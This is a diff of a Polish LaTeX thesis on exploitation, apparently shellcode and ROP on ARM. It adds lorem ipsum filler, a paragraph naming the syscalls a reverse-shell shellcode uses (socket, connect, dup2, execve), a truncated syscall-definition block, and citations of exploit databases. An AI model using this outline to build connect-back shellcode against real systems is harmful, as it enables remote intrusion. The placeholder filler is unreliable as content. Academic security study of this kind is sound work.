+Proin aliquet vel sem aliquam dictum. Aenean non nulla mattis, tincidunt nunc at, tempus sem. Sed vulputate, elit et molestie scelerisque, turpis mauris placerat augue, id ultricies augue nibh vitae felis. Nulla at imperdiet dolor. Vivamus nec hendrerit ligula. Nullam imperdiet odio massa, vitae varius ipsum porta sed. Donec placerat ante eu dapibus pulvinar.
+
+Nulla enim nunc, dapibus vel feugiat ut, ornare ut nisi. Aliquam nec cursus neque. Fusce elementum libero urna, id porttitor libero egestas a. Integer consequat metus tortor, a suscipit neque elementum eget. Ut aliquet libero sit amet tellus congue, in consequat urna mattis. Nulla euismod lacus nisi, vel mattis enim tempus ut. Etiam quis sapien enim. Quisque ac purus eget sapien tincidunt pretium. Cras non rutrum erat, at vulputate sem. Sed vel consequat nisi, egestas interdum erat.
+
+Integer arcu nulla, interdum fermentum luctus ac, condimentum vel risus. Cras tortor arcu, commodo quis elit rutrum, imperdiet aliquam arcu. Suspendisse dolor nisi, porttitor eget enim quis, fermentum iaculis tellus. Maecenas aliquam ultricies tempor. Curabitur ut quam in tellus venenatis euismod quis id metus. Aliquam at pharetra felis. Donec at gravida ipsum, ac venenatis lacus. Morbi ac vulputate elit.
+
+Aenean in ornare massa. Praesent nec felis non neque congue volutpat. Integer porttitor nisi et sem fermentum, non mattis tortor suscipit. Duis massa lorem, ultrices a urna sed, suscipit dignissim est. Fusce malesuada feugiat diam, non condimentum nisi ultricies vitae. Donec in magna nibh. In ullamcorper, mauris at malesuada rutrum, neque turpis pellentesque ligula, quis ultrices nisi mi eget leo. Mauris nec turpis eget massa pretium luctus sit amet vitae massa. Nam adipiscing ut magna mattis dignissim. Sed tincidunt lectus sit amet odio malesuada tincidunt. Maecenas vitae malesuada neque. Nullam posuere iaculis sagittis. Proin ac sem eu sapien iaculis condimentum. Fusce condimentum gravida ligula, vitae euismod tellus tincidunt a. Pellentesque adipiscing vitae nisl vel tempor. Duis vel gravida diam, vel egestas erat.
+
+Curabitur sed lacus volutpat, ultricies est tempor, mattis odio. Ut porta erat et purus consequat, sed feugiat nunc luctus. Duis a nunc mi. Integer eu lorem sit amet nisi pharetra dapibus. Duis sed condimentum felis. Sed vitae augue nec mauris porttitor vehicula ac nec ante. Vestibulum quis tortor nec ligula aliquam feugiat. Donec id aliquet velit. Donec ac elit accumsan, sollicitudin libero sed, ultrices sem.
+
+
+
+Numery przerwań systemowych można znaleźć w pliku \verb+/usr/include/asm/unistd.h+. Poniżej zostały wypisane definicje przerwań użytych w 
+\textit{shellcodzie}, tj. \verb+socket+, \verb+connect+, \verb+dup2+, \verb+execve+
 
 \begin{verbatim}
 #define __NR_SYSCALL_BASE 0
@@ -1126,18 +1321,11 @@ struct in_addr {
 };
 \end{verbatim}
 
-% ogolnie opisać matesploita, 
-% materiały: 
-%  praca dla samsunga
-%  msf_user_guide.pdf
-
-
-% http://d.hatena.ne.jp/kaito834/20110508/1304846053
-% http://www.slideshare.net/mjza/bsides
-
 
 
 \chapter{Podsumowanie}
+
+\fi
 
 \begin{thebibliography}{99}
 \addcontentsline{toc}{chapter}{Bibliografia}
@@ -1188,6 +1376,11 @@ ARM}, 2010 \
 lib(c).} Computer Security Applications Conference, 2009 \
 
 \bibitem[20]{kompilator} Paweł Janic, \textit{Kompilator ROP}, praca magisterska, Uniwersytet Warszawski, 2012 \
+
+\bibitem[21]{exploitdb} The Exploit Database, \url{http://www.exploit-db.com/} \
+
+\bibitem[22]{packetstorm} Packet Storm, \url{http://packetstormsecurity.com/} \
+
 
 
 
